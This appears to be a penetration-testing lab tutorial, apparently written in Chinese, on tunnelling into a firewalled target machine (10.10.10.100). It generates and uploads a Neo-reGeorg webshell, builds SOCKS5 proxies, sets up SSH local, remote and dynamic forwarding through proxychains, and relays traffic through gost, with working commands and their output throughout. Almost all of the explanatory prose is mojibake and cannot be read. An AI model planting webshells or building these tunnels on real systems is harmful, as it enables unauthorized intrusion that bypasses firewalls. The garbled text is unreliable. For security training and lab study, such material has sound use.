# æ¸—é€æµ‹è¯•



## éš§é“

### ç«¯å£è¿‡æ»¤

**å…¥ç«™**ä»…å…è®¸TCP 80ç«¯å£ï¼ˆæ¥æ”¶å¤–éƒ¨è¯·æ±‚ï¼‰ï¼Œ**å‡ºç«™**ä»…å…è®¸ TCP 80 ç«¯å£ï¼ˆå·²å»ºç«‹çš„è¿æ¥ï¼‰ï¼Œå…¶ä»–ç«¯å£ï¼ˆå¦‚22/SSHã€443/HTTPSç­‰ï¼‰å’Œ ICMP åè®®å‡è¢«é˜»æ–­ã€‚



é¶æœºé™åˆ¶ï¼šä»…å…è®¸é€šè¿‡ 80 ç«¯å£å…¥ç«™ï¼Œä»…å…è®¸ 80 ç«¯å£å‡ºç«™ï¼Œä¸å…è®¸å…¶ä»–ä»»ä½•ç«¯å£å‡ºç«™ã€‚

![image-20250304094331572](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304094331572.png)



Neo-reGeorg å·¥å…·ç”Ÿæˆ phpã€jsp æ–‡ä»¶ï¼Œä¸Šä¼ åˆ°ç½‘ç«™åå¯ä»¥ä¸ç›®æ ‡ç½‘ç«™å»ºç«‹ socks5 è¿æ¥ã€‚

ç”Ÿæˆ tunnel æ–‡ä»¶

```
python neoreg.py generate -k 123 -o socks

...
    [+] Mkdir a directory: socks
    [+] Create neoreg server files:
       => socks/tunnel.cs
       => socks/tunnel.go
       => socks/tunnel.ashx
       => socks/tunnel.aspx
       => socks/tunnel.php
       => socks/tunnel.jsp
       => socks/tunnel.jspx
```



å°† tunnel.php æ–‡ä»¶ä¸Šä¼ åˆ°ç½‘ç«™ã€‚

![image-20250304100018267](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304100018267.png)



å¯åŠ¨ socks5 è¿æ¥

```
python neoreg.py -k 123 -u http://10.10.10.100/site/tunnel.php -l 0.0.0.0 -p 8080

...
+------------------------------------------------------------------------+
  Log Level set to [ERROR]
  Starting SOCKS5 server [0.0.0.0:8080]
  Tunnel at:
    http://10.10.10.100/site/tunnel.php
+------------------------------------------------------------------------+
```



proxychains4 é…ç½®æ–‡ä»¶è®¾ç½® socks5 æœåŠ¡å™¨

![image-20250304100143821](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304100143821.png)



ä½¿ç”¨ proxychain4 è¿æ¥åˆ°ç›®æ ‡æœåŠ¡å™¨

```
proxychains4 ssh jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

262 pacotes podem ser atualizados.
175 atualizaÃ§Ãµes sÃ£o atualizaÃ§Ãµes de seguranÃ§a.


Last login: Mon Mar  3 21:38:44 2025 from 10.10.10.100
jangow01@jangow01:~$ 
```



**Neo-reGeorg generate å·¥å…·å¸®åŠ©**

```
ç”¨æ³•: neoreg.py generate [-h] -k å¯†é’¥ [-o ç›®å½•] [-f æ–‡ä»¶] [-c çŠ¶æ€ç ] [-T æ¨¡æ¿/æ–‡ä»¶] [--read-buff å­—èŠ‚æ•°] [--max-read-size åƒå­—èŠ‚]

åŠŸèƒ½: ç”ŸæˆNeoregéš§é“WebShell

é€‰é¡¹è¯´æ˜:
  -h, --help            æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯
  -k KEY, --key KEY     å¿…å¡«å‚æ•°ï¼ŒæŒ‡å®šWebShellè¿æ¥å¯†é’¥
  -o DIR, --outdir DIR  æŒ‡å®šWebShellæ–‡ä»¶è¾“å‡ºç›®å½•
  -f FILE, --file FILE  ä¼ªè£…é¡µé¢æ–‡ä»¶è·¯å¾„ï¼ˆç”¨äºéšè—WebShellï¼‰
  -c CODE, --httpcode CODE
                        è®¾ç½®HTTPå“åº”çŠ¶æ€ç ï¼ˆé…åˆ-rå‚æ•°æ—¶å»ºè®®å€¼<400ï¼Œé»˜è®¤200ï¼‰
  -T STR/FILE, --request-template STR/FILE
                        è‡ªå®šä¹‰HTTPè¯·æ±‚æ¨¡æ¿ï¼ˆç¤ºä¾‹ï¼š'img=data:image/png;base64,NEOREGBODY&save=ok'ï¼‰
  --read-buff Bytes     è¿œç¨‹æ•°æ®è¯»å–ç¼“å†²åŒºå¤§å°ï¼ˆé»˜è®¤ï¼š513å­—èŠ‚ï¼‰
  --max-read-size KB    å•æ¬¡è¯·æ±‚æœ€å¤§è¯»å–é‡ï¼ˆé»˜è®¤ï¼š512KBï¼‰
```



**å·¥å…·å¸®åŠ©**

```
ç”¨æ³•: neoreg.py [-h] -u URI [-r URL] [-R] [-t IP:PORT] -k KEY [-l IP] [-p PORT] [-s] [-H LINE] [-c LINE] [-x LINE] [-T STR/FILE] [--php] [--php-skip-cookie]
               [--go] [--php-connect-timeout S] [--local-dns] [--read-buff KB] [--read-interval MS] [--write-interval MS] [--max-threads N] [--max-retry N]
               [--cut-left N] [--cut-right N] [--extract EXPR] [-v]

é€‰é¡¹:
  -h, --help            æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯
  -u URI, --url URI     åŒ…å«éš§é“è„šæœ¬çš„URLåœ°å€
  -r URL, --redirect-url URL
                        å†…ç½‘è½¬å‘è‡³æŒ‡å®šæœåŠ¡å™¨ (ä»…æ”¯æŒJava/.NET)
  -R, --force-redirect  å¼ºåˆ¶è½¬å‘ (ä»…JSP -r)
  -t IP:PORT, --target IP:PORT
                        ç½‘ç»œè½¬å‘ç›®æ ‡åœ°å€ï¼Œè®¾ç½®åå¯ç”¨ç«¯å£è½¬å‘
  -k KEY, --key KEY     æŒ‡å®šè¿æ¥å¯†é’¥
  -l IP, --listen-on IP ç›‘å¬åœ°å€ (é»˜è®¤: 127.0.0.1)
  -p PORT, --listen-port PORT
                        ç›‘å¬ç«¯å£ (é»˜è®¤: 1080)
  -s, --skip            è·³è¿‡å¯ç”¨æ€§æ£€æµ‹
  -H LINE, --header LINE
                        æ·»åŠ è‡ªå®šä¹‰è¯·æ±‚å¤´
  -c LINE, --cookie LINE
                        è‡ªå®šä¹‰åˆå§‹åŒ–Cookie
  -x LINE, --proxy LINE
                        ä½¿ç”¨ä»£ç†æœåŠ¡å™¨ï¼Œæ ¼å¼ Proto://host[:port]
  -T STR/FILE, --request-template STR/FILE
                        HTTPè¯·æ±‚æ¨¡æ¿ (ç¤ºä¾‹: 'img=data:image/png;base64,NEOREGBODY&save=ok')
  --php                 ä½¿ç”¨PHPè¿æ¥æ¨¡å¼
  --php-skip-cookie     è·³è¿‡PHPçš„Cookieå¯ç”¨æ€§æ£€æŸ¥
  --go                  ä½¿ç”¨Goè¿æ¥æ¨¡å¼
  --php-connect-timeout S
                        PHPè¿æ¥è¶…æ—¶æ—¶é—´ (é»˜è®¤: 0.5ç§’)
  --local-dns           ä½¿ç”¨æœ¬åœ°DNSè§£æ
  --read-buff KB        æœ¬åœ°è¯»å–ç¼“å†²åŒºå¤§å°ï¼Œå•æ¬¡POSTæœ€å¤§æ•°æ®é‡ (é»˜è®¤: 7KB, æœ€å¤§: 50KB)
  --read-interval MS    æ•°æ®è¯»å–é—´éš” (æ¯«ç§’ï¼Œé»˜è®¤: 300)
  --write-interval MS   æ•°æ®å†™å…¥é—´éš” (æ¯«ç§’ï¼Œé»˜è®¤: 200)
  --max-threads N       æœ€å¤§ä»£ç†çº¿ç¨‹æ•° (é»˜è®¤: 400)
  --max-retry N         æœ€å¤§é‡è¯•æ¬¡æ•° (é»˜è®¤: 10)
  --cut-left N          æˆªå–å“åº”ä½“å·¦ä¾§Nå­—èŠ‚
  --cut-right N         æˆªå–å“åº”ä½“å³ä¾§Nå­—èŠ‚
  --extract EXPR        æ‰‹åŠ¨æå–å“åº”ä½“å†…å®¹ (ç¤ºä¾‹: <html><p>NEOREGBODY</p></html>)
  -v                    å¢åŠ è¾“å‡ºè¯¦ç»†ç¨‹åº¦ (ä½¿ç”¨ -vv æˆ–æ›´å¤šå‚æ•°ä»¥è·å–æ›´è¯¦ç»†è¾“å‡º)
```



#### ç«¯å£è½¬å‘ç¤ºä¾‹

å°†æœ¬åœ° 2222 ç«¯å£çš„æ•°æ®è½¬å‘åˆ°è¿œç¨‹ 22 ç«¯å£ã€‚

```
neoreg -k 123 -u http://10.10.10.100/site/tunnel.php --php -l 0.0.0.0 -p 2222 -t 127.0.0.1:22 
```





### ssh éš§é“

#### æœ¬åœ°ç«¯å£è½¬å‘

å°†æœ¬åœ°ä¸»æœºçš„æŸä¸ªç«¯å£é€šè¿‡ SSH éš§é“è½¬å‘åˆ°è¿œç¨‹æœåŠ¡å™¨çš„æŒ‡å®šç«¯å£ã€‚

```
ssh -L [æœ¬åœ°IP:]æœ¬åœ°ç«¯å£:ç›®æ ‡ä¸»æœº:ç›®æ ‡ç«¯å£ ç”¨æˆ·å@SSHæœåŠ¡å™¨
```

```
ssh -L 3306:localhost:3306 user@example.com
```

- æœ¬åœ° `3306` ç«¯å£çš„æµé‡ä¼šè¢«è½¬å‘åˆ° `example.com` æœåŠ¡å™¨çš„ `localhost:3306`ï¼ˆå¦‚ MySQLï¼‰ã€‚
- è‹¥éœ€å…è®¸å…¶ä»–è®¾å¤‡è®¿é—®æœ¬åœ°ç«¯å£ï¼Œå¯ç»‘å®šåˆ° `0.0.0.0`ã€‚



**Unix åŸŸå¥—æ¥å­—è½¬å‘**

å°†æœ¬åœ° Unix Socket è½¬å‘åˆ°è¿œç¨‹ Unix Socketï¼ˆSSH 7.3+ æ”¯æŒï¼‰ã€‚

```
ssh -R [è¿œç¨‹å¥—æ¥å­—è·¯å¾„]:[æœ¬åœ°å¥—æ¥å­—è·¯å¾„] ç”¨æˆ·å@SSHæœåŠ¡å™¨
```

```
ssh -L /tmp/local.sock:/var/run/remote.sock user@example.com
```



#### è¿œç¨‹ç«¯å£è½¬å‘

å°†è¿œç¨‹æœåŠ¡å™¨çš„æŸä¸ªç«¯å£é€šè¿‡ SSH éš§é“è½¬å‘å›æœ¬åœ°ä¸»æœºçš„æŒ‡å®šç«¯å£ï¼ˆåå‘éš§é“ï¼‰ã€‚

```
ssh -R [è¿œç¨‹IP:]è¿œç¨‹ç«¯å£:æœ¬åœ°ä¸»æœº:æœ¬åœ°ç«¯å£ ç”¨æˆ·å@SSHæœåŠ¡å™¨
```

```
ssh -R 8080:localhost:80 user@example.com
```

- è¿œç¨‹æœåŠ¡å™¨ `example.com` çš„ `8080` ç«¯å£æµé‡ä¼šè½¬å‘åˆ°æœ¬åœ°çš„ `80` ç«¯å£ï¼ˆå¦‚æœ¬åœ° Web æœåŠ¡ï¼‰ã€‚
- é»˜è®¤ç»‘å®šåˆ°è¿œç¨‹æœåŠ¡å™¨çš„ `127.0.0.1`ï¼Œéœ€åœ¨ SSH æœåŠ¡å™¨é…ç½®ä¸­å¯ç”¨ `GatewayPorts yes` ä»¥å…è®¸å¤–éƒ¨è®¿é—®ã€‚



**Unix åŸŸå¥—æ¥å­—è½¬å‘**

å°†è¿œç¨‹ Unix åŸŸå¥—æ¥å­—ï¼ˆRemote Unix Socketï¼‰è½¬å‘åˆ°æœ¬åœ°ã€‚

```
ssh -R [æœ¬åœ°å¥—æ¥å­—è·¯å¾„]:[è¿œç¨‹å¥—æ¥å­—è·¯å¾„] ç”¨æˆ·å@SSHæœåŠ¡å™¨
```

```
ssh -R /var/run/remote_service.sock:/tmp/local.sock user@example.com
```



#### åŠ¨æ€ç«¯å£è½¬å‘

åˆ›å»º SOCKS ä»£ç†æœåŠ¡å™¨ï¼ŒåŠ¨æ€è½¬å‘æ‰€æœ‰æµé‡åˆ°è¿œç¨‹ç½‘ç»œã€‚

```
ssh -D [æœ¬åœ°IP:]æœ¬åœ°ç«¯å£ ç”¨æˆ·å@SSHæœåŠ¡å™¨
```

```
ssh -D 1080 user@example.com
```

- åœ¨æœ¬åœ° `1080` ç«¯å£å¯åŠ¨ SOCKS5 ä»£ç†ï¼Œæµè§ˆå™¨æˆ–åº”ç”¨é…ç½®ä»£ç†åï¼Œæµé‡ç» `example.com` è½¬å‘ã€‚



#### å¤šè·³éš§é“

å¤šè·³éš§é“ï¼ˆJump Host æˆ– ProxyJumpï¼‰æ˜¯ä¸€ç§é€šè¿‡å¤šä¸ªä¸­é—´ SSH æœåŠ¡å™¨ï¼ˆè·³æ¿æœºï¼‰è¿æ¥åˆ°ç›®æ ‡ä¸»æœºçš„æŠ€æœ¯ï¼Œç±»ä¼¼â€œé“¾å¼è¿æ¥â€ã€‚

```
ssh -J user1@jump_host user2@target_host
```

- å…ˆé€šè¿‡ `user1@jump_host` è¿æ¥åˆ°ç¬¬ä¸€ä¸ªè·³æ¿æœºã€‚
- å†ä» `jump_host` è¿æ¥åˆ°æœ€ç»ˆç›®æ ‡ä¸»æœº `target_host`ï¼ˆèº«ä»½ä¸º `user2`ï¼‰ã€‚



SSH åè®®æœ¬èº«æ— è·³æ•°é™åˆ¶ï¼Œå¯é€šè¿‡é€—å·åˆ†éš”å¤šä¸ªè·³æ¿æœºï¼š

```
ssh -J user1@jump1,user2@jump2,user3@jump3 user4@target_host
```

- è¿æ¥è·¯å¾„ï¼šæœ¬åœ° â†’ `jump1` â†’ `jump2` â†’ `jump3` â†’ `target_host`ã€‚



ä½¿ç”¨å¤šè·³éš§é“åŒæ—¶å¯ä»¥ä½¿ç”¨  `-L` æˆ– `-R` å‚æ•°è¿›è¡Œç«¯å£è½¬å‘ã€‚

```
ssh -J user1@jump_host -L æœ¬åœ°ç«¯å£:ç›®æ ‡ä¸»æœº:ç›®æ ‡ç«¯å£ user2@target_host
```

- æœ¬åœ°ç«¯å£æµé‡ â†’ è·³æ¿æœº `jump_host` â†’ ç›®æ ‡ä¸»æœº `target_host` çš„ç«¯å£ã€‚



```
ssh -J user1@jump_host -R è¿œç¨‹ç«¯å£:æœ¬åœ°æœåŠ¡ä¸»æœº:æœ¬åœ°ç«¯å£ user2@target_host
```

- ç›®æ ‡ä¸»æœº `target_host` çš„è¿œç¨‹ç«¯å£ â†’ è·³æ¿æœº `jump_host` â†’ æœ¬åœ°æœåŠ¡ä¸»æœºçš„ç«¯å£ã€‚



#### ssh + socks5

é¶æœºçš„ SSH æœåŠ¡è¿è¡Œåœ¨ 22 ç«¯å£ï¼Œä½†é˜²ç«å¢™è§„åˆ™é˜»æ­¢äº†æ‰€æœ‰å¤–éƒ¨å¯¹è¯¥ç«¯å£çš„ç›´æ¥å…¥ç«™è¿æ¥ï¼ˆå³å¤–éƒ¨æ— æ³•ç›´æ¥è®¿é—®é¶æœºçš„ 22 ç«¯å£ï¼‰ã€‚

æœ¬åœ°æœºå™¨ä¸Šå¯åŠ¨äº†ä¸€ä¸ª SOCKS5 ä»£ç†æœåŠ¡ï¼Œç›‘å¬åœ¨ 127.0.0.1ï¼ˆå³æœ¬æœºï¼‰çš„ 8080 ç«¯å£ï¼Œè¯¥ä»£ç†èƒ½å¤Ÿç»•è¿‡é˜²ç«å¢™é™åˆ¶ï¼Œé€šè¿‡å…¶ä»–å·²å»ºç«‹çš„é€šä¿¡æ¸ é“å°†æµé‡é—´æ¥ä¼ è¾“åˆ°é¶æœºå†…éƒ¨ç½‘ç»œä¸­ã€‚

é€šè¿‡æ­¤ SOCKS5 ä»£ç†ï¼Œç”¨æˆ·å¯å°† SSH å®¢æˆ·ç«¯æµé‡å°è£…å¹¶è½¬å‘åˆ°é¶æœºçš„ 22 ç«¯å£ã€‚



**ç›´æ¥è®¿é—®ï¼ˆå¤±è´¥ï¼‰**

```

```



**proxychains4**

ä½¿ç”¨ proxychains4 ä»£ç†æµé‡ï¼Œ**æ™®é€š ssh è¿æ¥**ã€‚

```
proxychains4 ssh jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ 
```



å°†**æœ¬åœ° 2222 ç«¯å£**è½¬å‘åˆ°**è¿œç¨‹ 22 ç«¯å£**

```
proxychains4 ssh -L 2222:127.0.0.1:22 -Nf jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
```



ç›´æ¥ä½¿ç”¨æœ¬åœ° 2222 ç«¯å£å³å¯è¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨

```
ssh jangow01@127.0.0.1 -p 2222

jangow01@127.0.0.1's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ 
```



å°†**è¿œç¨‹ 4444 ç«¯å£**è½¬å‘åˆ°**æœ¬åœ° 4444 ç«¯å£**

```
proxychains4 ssh -R 4444:127.0.0.1:4444 jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
```



è¿œç¨‹ä¸»æœºå·²ç»ç›‘å¬ 4444 ç«¯å£

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name	
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN       -               
```



æœ¬åœ°ä½¿ç”¨ nc ç›‘å¬ 4444 ç«¯å£ï¼Œè¿œç¨‹ä¸»æœºå°è¯•è¿æ¥ 127.0.0.1 4444 ç«¯å£

```
jangow01@jangow01:~$ nc 127.0.0.1 4444
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:4444  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:4444  ...  OK
...
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:4444  ...  OK
...
```

**proxychains4 çš„å·¥ä½œåŸç†**æ˜¯é€šè¿‡ `LD_PRELOAD` åŠ¨æ€åº“åŠ«æŒåº”ç”¨ç¨‹åºçš„æ‰€æœ‰ TCP è¿æ¥ï¼Œå¼ºåˆ¶å°†è¿™äº›è¿æ¥é€šè¿‡é¢„å…ˆé…ç½®çš„ä»£ç†æœåŠ¡å™¨è½¬å‘ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¼šåŠ«æŒåŒ…æ‹¬æœ¬åœ°å›ç¯åœ°å€ï¼ˆ`127.0.0.1`ï¼‰åœ¨å†…çš„æ‰€æœ‰è¿æ¥ã€‚

å‡è®¾è¿œç¨‹ SSH æœåŠ¡å™¨å°† `127.0.0.1:4444` çš„æµé‡è½¬å‘åˆ°æœ¬åœ°å®¢æˆ·ç«¯ï¼Œè€Œæœ¬åœ°å®¢æˆ·ç«¯å°è¯•å°†æ•°æ®å‘é€åˆ°æœ¬åœ°çš„ `127.0.0.1:4444` ç«¯å£ã€‚ç”±äº proxychains4 åŠ«æŒäº†æ­¤è¿æ¥ï¼Œæ•°æ®ä¼šè¢«é‡æ–°å‘é€åˆ°è¿œç¨‹ SSH æœåŠ¡å™¨ï¼Œå¯¼è‡´è¿œç¨‹æœåŠ¡å™¨åˆå°†æ•°æ®ä¼ å›æœ¬åœ°ï¼Œå½¢æˆ **æ— é™å¾ªç¯**ã€‚

**è§£å†³æ–¹æ¡ˆ**æ˜¯ä¿®æ”¹ proxychains4 çš„é…ç½®æ–‡ä»¶ï¼Œä½¿å…¶å¿½ç•¥å¯¹æœ¬åœ°å›ç¯åœ°å€ï¼ˆ`127.0.0.1`ï¼‰çš„åŠ«æŒã€‚åœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ  `localnet` å­—æ®µï¼Œä¾‹å¦‚ï¼š

```
localnet 127.0.0.0/8
```



é‡æ–°å¼€å¯è¿œç¨‹ç«¯å£è½¬å‘

```
proxychains4 ssh -R 4444:127.0.0.1:4444 jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ netstat -tunpl 
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name	
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN       -               

jangow01@jangow01:~$ nc 127.0.0.1 4444 
hello 
```



æœ¬åœ° nc æˆåŠŸæ¥æ”¶åˆ°æ•°æ®

```
root@localhost:~# nc -l -p 4444
hello
```



#### ProxyCommand

ProxyCommand å‘Šè¯‰ SSH å®¢æˆ·ç«¯ä¸è¦ç›´æ¥è¿æ¥ç›®æ ‡æœåŠ¡å™¨ï¼Œè€Œæ˜¯é€šè¿‡æŒ‡å®šçš„å‘½ä»¤ï¼ˆæ­¤å¤„æ˜¯ ncï¼‰å»ºç«‹éš§é“ã€‚SSH çš„æµé‡ä¼šé€šè¿‡ä½ æŒ‡å®šçš„ä»£ç†å‘½ä»¤ï¼ˆè¿™é‡Œæ˜¯ `nc`ï¼‰è½¬å‘ã€‚

```
ssh -o ProxyCommand="nc -x 127.0.0.1:8080 %h %p" jangow01@10.10.10.100
```

 **nc -x 127.0.0.1:8080 %h %p** å‘½ä»¤

- **`nc`**ï¼š`netcat` å·¥å…·ï¼Œç”¨äºç½‘ç»œé€šä¿¡ã€‚

- **`-x 127.0.0.1:8080`**ï¼šæŒ‡å®šä½¿ç”¨æœ¬åœ°çš„ `8080` ç«¯å£ä½œä¸º SOCKS5 ä»£ç†ã€‚

- `%h` å’Œ `%p`

    ï¼šSSH å®¢æˆ·ç«¯è‡ªåŠ¨æ›¿æ¢çš„å˜é‡ï¼š

    - `%h` â†’ ç›®æ ‡ä¸»æœºåœ°å€ï¼ˆå¦‚ `10.10.10.100`ï¼‰ã€‚
    - `%p` â†’ ç›®æ ‡ç«¯å£ï¼ˆå¦‚ SSH é»˜è®¤çš„ `22`ï¼‰ã€‚



ä¸ä»…åªæœ‰ nc å·¥å…·ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–çš„å·¥å…·ï¼ˆå¦‚ï¼šconnectï¼‰

```
ssh -o ProxyCommand="connect -S 127.0.0.1:8080 %h %p" jangow01@10.10.10.100
```

æ³¨ï¼šåœ¨ ubuntu ä¸­ connect å·¥å…·éœ€è¦å®‰è£… connect-proxy å·¥å…·ï¼ˆ**apt install connect-proxy**ï¼‰



ProxyCommand æ˜¯ ssh é»˜è®¤æ”¯æŒçš„å‚æ•°ï¼Œä¸ nc ç­‰å…¶ä»–å·¥å…·æ­é…éå¸¸ç®€å•ï¼Œå³ä½¿æ˜¯**è¿œç¨‹ç«¯å£è½¬å‘ä¹Ÿæ— éœ€é¢å¤–é…ç½®**ã€‚



### gost

ssh ä½¿ç”¨ç«¯å£è½¬å‘éœ€è¦åœ¨ sshd_config å°† AllowTcpForwarding é€‰é¡¹è®¾ç½®ä¸º yesï¼ˆé»˜è®¤å¼€å¯ï¼‰ï¼Œå¦‚æœç”¨æˆ·ä¸»åŠ¨å…³é—­äº† ssh è½¬å‘åˆ™å¯ä»¥ä½¿ç”¨ gost å·¥å…·æ›¿ä»£ã€‚

gost çš„å…¨ç§°æ˜¯ GO Simple Tunnelï¼Œå®ƒæ˜¯ä¸€ä¸ªä½¿ç”¨ GO è¯­è¨€å®ç°çš„å®‰å…¨éš§é“ï¼Œ**æ”¯æŒ**ç®€å•**å‘½ä»¤è¡Œå‚æ•°**å¿«é€Ÿä½¿ç”¨å’Œå¤æ‚çš„**é…ç½®æ–‡ä»¶**ã€‚å…¶åŠŸèƒ½å¼ºå¤§ï¼Œæ”¯æŒå¤šç§åè®®ã€‚



åœ¨é¶æœºä¸Š gost ä½¿ç”¨ relay ç›‘å¬ 3333 ç«¯å£ï¼Œæ”»å‡»æœºé€šè¿‡ Neo-reGeorgï¼ˆPHPï¼‰å°†æœ¬åœ° 3333 ç«¯å£è½¬å‘åˆ°è¿œç¨‹ 3333 ç«¯å£ï¼Œæ”»å‡»æœºçš„ gost åªéœ€è¿æ¥æœ¬åœ°çš„ 3333 ç«¯å£å³å¯ä¸é¶æœº gost è¿›è¡Œäº¤äº’ã€‚



åœ¨é¶æœºä¸Šæ‰§è¡Œ gost ç¨‹åºï¼Œä½¿ç”¨ relay åè®®ç›‘å¬ 3333 ç«¯å£

![image-20250304201410339](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304201410339.png)

æ³¨ï¼šè®¾ç½®å¤šä¸ªå‚æ•°ï¼Œéœ€ä½¿ç”¨ `&` ç¬¦å·åˆ†éš”å‚æ•°ï¼Œå¹¶é€šè¿‡ **URL ç¼–ç æ ¼å¼**ï¼ˆå¦‚ç©ºæ ¼ç”¨ `%20`ï¼Œä¸€èˆ¬å‚æ•°æ— éœ€æ‰‹åŠ¨è½¬ä¹‰ï¼‰ï¼Œé‡ç‚¹æ³¨æ„ **å¼•å·åŒ…è£¹å‘½ä»¤** å’Œ **å‚æ•°åˆ†éš”ç¬¦ `&`** çš„æ­£ç¡®ä½¿ç”¨ã€‚



åœ¨æ”»å‡»æœºä¸Šä½¿ç”¨ Neo-reGeorg å·¥å…·ï¼Œå°†æœ¬åœ° 3333 ç«¯å£è½¬å‘åˆ°é¶æœº 3333 ç«¯å£ã€‚

```
neoreg -k 123 -u http://10.10.10.100/site/tunnel.php --read-interval 1 --write-interval 1 --php -l 0.0.0.0 -p 3333 -t 127.0.0.1:3333
```

æ³¨ï¼šåœ¨ä»¥ä¸‹æ‰€æœ‰å‘½ä»¤ä¸­ 127.0.0.1:3333 ç›¸å½“äº 10.10.10.100:3333



#### æœ¬åœ°ç«¯å£è½¬å‘

å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°é¶æœºä¸Šçš„ç«¯å£

```
gost -L tcp://:2222/127.0.0.1:22 -F relay://127.0.0.1:3333?nodelay=true
```

å°†æœ¬åœ°çš„TCPç«¯å£ 2222 æ˜ å°„åˆ° 10.10.10.100 çš„ 2222 ç«¯å£ï¼Œæ‰€æœ‰åˆ°æœ¬åœ° 2222 ç«¯å£çš„æ•°æ®ä¼šè¢«è½¬å‘åˆ° 10.10.10.100:2222ã€‚



#### è¿œç¨‹ç«¯å£è½¬å‘

å°†è¿œç¨‹é¶æœºç«¯å£è½¬å‘åˆ°æœ¬åœ°ç«¯å£

```
gost -L rtcp://:4444/127.0.0.1:4444 -F relay://127.0.0.1:3333?nodelay=true
```

æ ¹æ®rtcpæœåŠ¡æŒ‡å®šçš„åœ°å€ï¼Œé€šè¿‡è½¬å‘é“¾åœ¨ä¸»æœº 10.10.10.**100** ä¸Šç›‘å¬ 4444 TCPç«¯å£ã€‚å½“æ”¶åˆ°è¯·æ±‚åå†é€šè¿‡è½¬å‘é“¾å°†æ•°æ®è½¬å‘ç»™rtcpæœåŠ¡ï¼ŒrtcpæœåŠ¡å†å°†è¯·æ±‚è½¬å‘åˆ° 10.10.10.**10**:4444 ç«¯å£ï¼ˆ10.10.10.10 ä¸ºæœ¬æœº IPï¼Œå³å‘½ä»¤ä¸­çš„ 127.0.0.1:4444ï¼‰ã€‚

æ³¨ï¼šå¦‚æœä¸ä½¿ç”¨è½¬å‘é“¾ï¼ˆ-Fï¼‰ï¼Œåˆ™ tcp å’Œ rtcp æ— åŒºåˆ«ã€‚



æœ¬åœ°ç«¯å£è½¬å‘å’Œè¿œç¨‹ç«¯å£è½¬å‘å¯ä»¥åœ¨ä¸€ä¸ª gost è¿›ç¨‹ä¸ŠåŒæ—¶è¿è¡Œï¼Œä»¥ä¸‹å‘½ä»¤ç­‰ä»·ï¼š

```
gost -L tcp://:2222/127.0.0.1:22 -F relay://127.0.0.1:3333?nodelay=true -L rtcp://:4444/127.0.0.1:4444 -F relay://127.0.0.1:3333?nodelay=true -L rtcp://:5555/127.0.0.1:5555 -F relay://127.0.0.1:3333?nodelay=true
```

```
gost -L tcp://:2222/127.0.0.1:22 -L rtcp://:4444/127.0.0.1:4444 -L rtcp://:5555/127.0.0.1:5555 -F relay://127.0.0.1:3333?nodelay=true
```

- **`-L` å®šä¹‰æœåŠ¡å…¥å£**ï¼šæ¯ä¸ª `-L` å‚æ•°è¡¨ç¤ºä¸€ä¸ªç‹¬ç«‹çš„æœåŠ¡ï¼ˆå¦‚ç›‘å¬ç«¯å£ã€åè®®ç±»å‹ï¼‰ã€‚
